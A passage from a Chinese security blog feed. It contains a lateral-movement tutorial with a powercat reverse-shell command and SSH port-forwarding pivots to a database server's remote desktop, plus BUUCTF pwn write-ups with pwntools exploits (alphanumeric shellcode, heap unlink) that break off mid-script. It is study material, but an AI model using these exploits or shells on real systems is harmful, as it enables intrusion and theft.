title="反向链接"></a>反向链接</h3><p>攻击机先监听本机5555端口<code>nc -lpvv 5555</code></p><p>靶机：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-p</span> <span class="number">5555</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1.ssh"></a>1.ssh</h3><p>常见参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台执行SSH</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发</span><br><span class="line">-P 指定SSH端口</span><br></pre></td></tr></table></figure><p>网络拓扑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br><span class="line"></span><br><span class="line">实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问</span><br><span class="line"></span><br><span class="line">实验目标：通过本地端口转发，访问攻击机本地的5555端口便可以打开数据库服务器的远程桌面</span><br></pre></td></tr></table></figure><h4 id="1-本地转发"><a href="#1-本地转发" class="headerlink" title="1.本地转发"></a>1.本地转发</h4><p>在攻击机上：</p><p><code>ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5</code>(这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机)</p><p>之后会输入web服务器的密码，由于是静默模式，可以本地查看5555端口是否被监听来检查通道的建立是否正常</p><p><code>netstat -tulnp | grep &quot;5555&quot;</code></p><p>接下来攻击机访问本机5555端口即可打开数据库的远程桌面：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-远程转发"><a href="#2-远程转发" class="headerlink" title="2.远程转发"></a>2.远程转发</h4><p>在web服务器上：</p><p><code>ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4</code>（这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的5555都是web服务器主动发起）</p><p>之后输入攻击机的密码，在攻击机访问本地的5555端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3.动态转发"></a>3.动态转发</h4><p>在攻击机上：</p><p><code>ssh -CfNg -D 6000 root@192.168.1.5</code>（搭建了一个动态的SOCKS代理通道）</p><p>之后输入web服务器的密码，查看是否链接成功<code>netstat -tulnp | grep &quot;:6000&quot;</code></p><p>然后在本地浏览器设置好socks代理就可访问数据服务器上开放的web服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;隐藏通信隧道技术&quot;&gt;&lt;a href=&quot;#隐藏通信隧道技术&quot; class=&quot;headerlink&quot; title=&quot;隐藏通信隧道技术&quot;&gt;&lt;/a&gt;隐藏通信隧道技术&lt;/h1&gt;&lt;p&gt;当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否</summary>
      
    
    
    
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>2021年终总结</title>
    <link href="http://example.com/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2022-02-04T16:00:00.000Z</published>
    <updated>2022-02-06T05:03:48.431Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="0b8bf37f576d56e41d751f6bfb99582e12aa305a83b552e783d8da9ee3d66bc2">305e8718864ef4d8feb4c216f8ddc50eeb8631f473c6c8adb2e542944eace3265ae88ab1e24db73cb5a18f140bbf62478a9cf5f182adf00f11f9ca093f890d48ab93b48562b4f245617a13f4502c20c59638f18dca507bf149f16c4699ab87ac457fb8042c69c16f74833b3d4a89bc24c7a57659a0a590c3b2653436ff1ad1d33f8182bdaf755648f2b375c9eefd353685f52a87ed048444300ddc1a16891c6a94976ed09269ce3d8d2c167901bbe16e8bda77a66ab17664e9e650494b619af8eda6bce8ebabeae153b8648e8714e72cbfe725abf763909f1a87b91c2fe6fe5521984a1c5bbe433c2f6b82e0f5826264197f5548aed7e443d67893e3a1c7d4af0eb048c820c5037761dbe7dd7ac725158ee416c70ddea840a758826e77904c7e8ab9c33b46157554c243cc93c5148cbf2dc65f5cdff7c821fcc3b333c7ab3637ddc59696506d7a1ba49fae894811d6ae0bce2a5d003a17edc98988ba2818eaf958d35871ed83632717031aeaaeb44c724411d0f6c8e076b247667ef0a06114f3f6ca3f6b9e5182a193f3a0a9ef014e2502de15579518567532e69c6150cb9b97c0c7e7415931566285c77be76590c0f1ba9fa69a7027e3e52cc893af99f79e3a1ae864c91d54ad181ec96acf0fb82bff03e7ecae041a0f01231da51e0ddf12fe8ab95410cf8a568f0874a3fd8c4ac0eed564b42d138d635b190ae64eda1064affa00b6285b141cf04b27bf53fe6419933ea5d3b2831b7fbdb39870ffbf7edb936ac0b058bba105ca21fd553b3065dc0cb46def5c56f26b318d0841ae9044e717ff891518f0d062e2d8791c7a4f6f78a7b90aaa82ba5d17258895aea28a41d83a197ef652ce5971635379cc251fdf2909ec40e63d82e0038a86b2e329313dea9039430406ec74d0cb2f0959f7cb2d8a02a5045367089760403eab6dab798229ab05024cdb2471b56e39e8481d33c90e2dcff288421457e0d034664555871325b3d473d15b037f68bfdaf02643171a4ec018ebaa8936438c279e9cf755507e3583f9ad0a00811155467b86d95f734d2b0977d4b4b73e75f952e1a7f246b925d88622ae0792c3c7ce7be4c088f1fa7ee9313f0f0ac4a04db153886ace5549accd2be58a4369405edf9eb865c314f24356e8b770d17cb7d061f5f3d29eb1518d27bb9d5adec10031bec9e8ffe096ff16283ef2b10b7e540a04c3fe13b2aa1593d053e9ba5150f5dbb5e685efee4bd8e1dfd9ca08e79ec4998ed2767d9295d19b09a66fa768fa77500a8918842b9c10613373fcb21c0ed5963e0b6501066da9cce7adcf40c25af184f08e5900efd8acbe3a31535866644cf8ffab86cc68c8de24e5e37a504cbe43d7e945784e108343dca76daf8e3f58e0a285bbcc17e02816a63f57d27f8323f83031c9a4da55629319d9fc874e1a1ebce94596750e0925e5392e6856d95a711003a70f377760bdbd078560f34eea24c9f3e4aca7b7bb2a5f31c255947a46fc5c91adcdde57b447ceccc56a06c1b95774696e04ee52a71f18d3bd40239ed94c86f9a4ed2b7c6b807c6e855a4596f5f71b25405f180669d55ad3959724bdd09b0a1f4d3b1855675e1a1a49dd43a672acd9534cc8b514947e88b1e61333349a253cf1e176026672bcb5af9515479a2f268db3ab7386e4de224d12fe3852d3cbabc7310005d903f1944f1f837152887d35cf5537639de368b98351a28caf84b9e17aa79852b2dd802401e60d83e171a1a1dfa7511b2955a6c5f4499cd85b3eced4b46c3ea6899115aaf7828b2e588202a5455d43c9458dd495a2470c509b740c9067d6db60d0d9286d80917e8c9c890bfc34e4dffc083bbb05035c79eafe08598ffbe50a840f3d49348c145ee7a53c149e90ea98825daf2ed36b8a3e0ffd6617339bc1666bad71f577b6893772c94d8c7a04d8ea235ed8c423154deeb5112759be1316829f24f0236e87c8bbf50a17fbcf520acb49c1d1edc23e5b09d9841f2c9ca219f2b7ce7edbbc2ff7b99343916b64cfd6f0510ce0533ed875a4ddcbacef55212cdd81b728ee358fac9467813c84a15576721c8ecfb3e12e0f5d0b5e1db36e6bb2df1f1d25e17d69311353cd9c2af0ab9e2d9a4f304a09e6140f72d272307b19607756174db476344bc618e188827ebff568fea3fcf130d404825b86f53b2a5b8bef28dbefa669cbf3ea683b66f928743f7aab021df505929f41815015e92c4695ba403de4260e573df67366ef92cc8cde084fd32e918c1b8fa921d58baa8408c9a95eb1dbd3361f3d7eac21497ec13c589be785e77ae72699e5932c39eb6a4e46b30a746c29175ba12511b6451e7f098d970a4fe37ea2dca2866e31bcc7650ba9b0f783a9daa3144316cf8cf1596925c84536c5d870e004b7ae965173e21cbb53be56f487321b801b87e1fceefdbf85ac97e757b4027c8070f7705646a75664922a31f72abecac30ad5d7469e9dae644e22f7ddfecc47217b388540703e3995a4fb159eda67864ed99989462cc9cd505c91af2f804b2fdd9c940128f810cbc640b35102496befe96c41c27b689b5ad3f098b8f4c73e419c0d10b3af3ce11e2e3114e368686f0870fb463924ee59c47e28cf37c8e263b4cfb43acefaec12f04332d435708a50d2426b1cfdceead4b7b962482bd18587530ab945d81731f2f26b0829993bf200e52d51ef330a5c0c82682cb541a8625cf07d6cd306423692ff5a19e3957ff9cec87cadf3268a763f8d2a2c8af41b06d723ff8d34f30d7f335f1a04f014287aeb58f7b54066454b256bc34a3eb4f7fec3997f86038d3341fd7f37b47a2d6e4ae67e5db35a5949ab8879219b418b345a3f0755ae73438bd2f2fccff8b5c0801d7da2a1b543fe6cc9f8a58e9cd27f534a040cd3a8b6f629bc5673eb40837622af3faa6dc3b2e9b77fc288732f98ff45c9ea731f57e79b0de345c41dc749127a08876936a3fc14b9576351cda9dbc691148611c8fb4393ebb937d4ff4eff90e4c2edf5ee47f567</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWN刷题_0x50-0x5F</title>
    <link href="http://example.com/2021/12/08/BUU-PWN-0x50-0x5F/"/>
    <id>http://example.com/2021/12/08/BUU-PWN-0x50-0x5F/</id>
    <published>2021-12-07T16:00:00.000Z</published>
    <updated>2021-12-09T09:50:41.625Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x50-mrctf2020-shellcode-revenge（可见字符shellcode）"><a href="#0x50-mrctf2020-shellcode-revenge（可见字符shellcode）" class="headerlink" title="0x50.mrctf2020_shellcode_revenge（可见字符shellcode）"></a>0x50.mrctf2020_shellcode_revenge（可见字符shellcode）</h1><p>因为call的缘故，没办法f5.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec mrctf2020_shellcode_revenge </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/mrctf2020_shellcode_revenge&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致流程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Show me your magic!\n&quot;</span>);</span><br><span class="line">buf = read(<span class="number">0x400</span>)</span><br><span class="line"><span class="keyword">if</span>(!(<span class="number">0x60</span>&lt;<span class="built_in">input</span>[i]&lt;<span class="number">0x7A</span> || <span class="number">0x2F</span>&lt;<span class="built_in">input</span>[i]&lt;ox5A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I Can&#x27;t Read This!&quot;</span>)</span><br><span class="line">buf()</span><br></pre></td></tr></table></figure><p>于是：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br><span class="line"><span class="built_in">cd</span> alpha3</span><br><span class="line">//需要先生成普通的shellcode</span><br><span class="line">vim sc.py</span><br></pre></td></tr></table></figure><p>sc.py中写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span><span class="comment">#这里用64位平台做示例</span></span><br><span class="line">sc = shellcraft.sh()<span class="comment">#这里用shell做示例</span></span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br></pre></td></tr></table></figure><p>之后写到shellcode中：<code>python sc.py &gt; shellcode</code></p><p>然后：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/alpha3$ python ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;../shellcode&quot;</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;mrctf2020_shellcode_revenge&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,29596)</span></span><br><span class="line">payload = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N&quot;</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x51-hitcontraining-unlink（unlink）"><a href="#0x51-hitcontraining-unlink（unlink）" class="headerlink" title="0x51.hitcontraining_unlink（unlink）"></a>0x51.hitcontraining_unlink（unlink）</h1><p>没开PIE</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec bamboobox </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/bamboobox&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>edit中对输入的长度没有做检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">change_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">      v2 = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">      *(*&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] + read(<span class="number">0</span>, *&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>], v2)) = <span class="number">0</span>;<span class="comment">//这里直接是按照输入的来读取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete没有问题</p><h2 id="解法一（对buu无用）"><a href="#解法一（对buu无用）" class="headerlink" title="解法一（对buu无用）"></a>解法一（对buu无用）</h2><p>fastbin attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x21</span>,<span class="string">&#x27;AAAAA&#x27;</span>)<span class="comment">#0  </span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;BBBBB&#x27;</span>)<span class="comment">#1  </span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;CCCC&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#为了溢出修改1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#fastbin -&gt; 1 -&gt; 2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x21</span>) <span class="comment">#修改1的fd指针，指向main开始时申请的内存地址</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;AAA&#x27;</span>)   </span><br><span class="line">    </span><br><span class="line">backdoor = <span class="number">0x0400D49</span> </span><br><span class="line">add(<span class="number">0x18</span>,p64(<span class="number">0</span>)+p64(backdoor))  <span class="comment">#将其第二个指针修改为backdoor的地址.</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>unlink</p><blockquote><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li> UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li> 已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>  使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>  设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li> 修改 fd 为 ptr - 0x18</li><li> 修改 bk 为 ptr - 0x10</li><li> 触发 unlink</li></ol><p>  ptr 处的指针会变为 ptr - 0x18。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26791</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itemlist0_ptr = <span class="number">0x6020C0</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span> * <span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;C&#x27;</span> * <span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)</span></span><br><span class="line">fake_chunk =  p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)  <span class="comment">#fake_chunk header</span></span><br><span class="line">fake_chunk += p64(itemlist0_ptr-<span class="number">0x18</span>) + p64(itemlist0_ptr-<span class="number">0x10</span>) <span class="comment">#fake_chunk fd  bk</span></span><br><span class="line">fake_chunk += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>) <span class="comment"># 1的presize </span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment"># 1的size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这里用p指代itemlist0_ptr</span></span><br><span class="line"><span class="string">FD = p -&gt; fd = p - 0x18</span></span><br><span class="line"><span class="string">BK = p -&gt; bk = p - 0x10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FD -&gt; bk = p</span></span><br><span class="line"><span class="string">BK -&gt; fd = p</span></span><br><span class="line"><span class="string">#通过检查</span></span><br><span class="line"><span class="string">FD -&gt; bk = BK 相当于  *(p) = p-0x10</span></span><br><span class="line"><span class="string">BK -&gt; fd = FD 相当于  *(p) = p-0x18</span></span><br><span class="line"><span class="string">我们把p的值改为了p的地址-0x18,使得p的值不再是堆的地址，而是itemlist附近的地址。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#前向合并，合并0中的fake_chunk  放入 unsorted bin 中 ,同时 itemlist0_ptr = 